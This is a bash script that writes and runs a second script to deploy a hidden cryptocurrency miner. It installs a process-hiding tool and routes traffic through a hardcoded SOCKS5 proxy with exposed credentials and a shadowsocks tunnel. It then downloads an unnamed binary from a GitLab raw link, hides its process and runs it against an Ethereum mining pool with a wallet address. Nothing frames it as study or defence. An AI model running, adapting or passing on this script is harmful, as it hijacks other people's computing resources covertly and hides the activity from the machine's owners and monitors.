#!/bin/bash
cat << "EOF" > run.sh

#!/bin/bash
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 192.186.186.7:6049
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
chmod +x 145

apt -y install shadowsocks-libev rng-tools
ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
ph add 145
./145 --url=ssl://0x9baccb443d4eee6831b541ac17c28c1b61fdab81.tes@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
EOF

chmod +x run.sh

./run.sh
